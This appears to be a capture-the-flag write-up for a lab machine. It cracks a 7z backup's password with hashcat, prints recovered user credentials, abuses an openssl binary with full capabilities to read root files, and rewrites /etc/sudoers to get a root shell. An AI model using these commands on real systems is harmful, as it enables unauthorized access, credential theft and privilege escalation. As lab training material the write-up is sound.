shell as ldapuser1
------------------
- there is a file called backup.7z in the home directory of the ldapuser2 
- transfer the file to attacking machine 
- when we try to open it, it asks for a password 
- we can use 7z2john to generate a hash for the file and crack it using hashcat

	7z2john backup.7z > backup.hash
	hashcat -m 11600 -a 0 -o backup.cracked backup.hash /usr/share/wordlists/rockyou.txt --force

- now we can see the contents of the zip file which is a backup for the web directories 
- on checking those we found credentials for ldapuser1 in status.php

	creds : ldapuser1 : f3ca9d298a553da117442deeb6fa932d

- we can switch user with this password to get a shell as ldapuser1 

Priv-esc
--------
- on checking the files inside ldapuser1 home directory we have tcpdump and openssl
- on checking the capabilities for tcpdump and openssl, we see that openssl has =ep capabilities
- the =ep capabilities means that the binary has all the capabilities 
- hence the openssl binary is useful to us 
- we can read the root flag with openssl

	./openssl base64 -in /root/root.txt | base64 -d

Shell as root
-------------
- we can edit /etc/sudoers file to get a shell as root
- get a copy of the /etc/sudoers file

	./openssl base64 -in /etc/sudoers | base64 -d > /dev/shm/t

- add a line to allow the current user to run all commands with root permission 

	echo "ldapuser1    ALL=(ALL)       ALL" >> /dev/shm/t

- replace the /etc/sudoers file in the victim machine with the edited one 

	cat /dev/shm/t | base64 | ./openssl enc -d -base64 -out /etc/sudoers

- since we have an entry in the /etc/sudoers file we can run sudo su to change into root 

	sudo su

- we get a shell as root
- grab the root flag
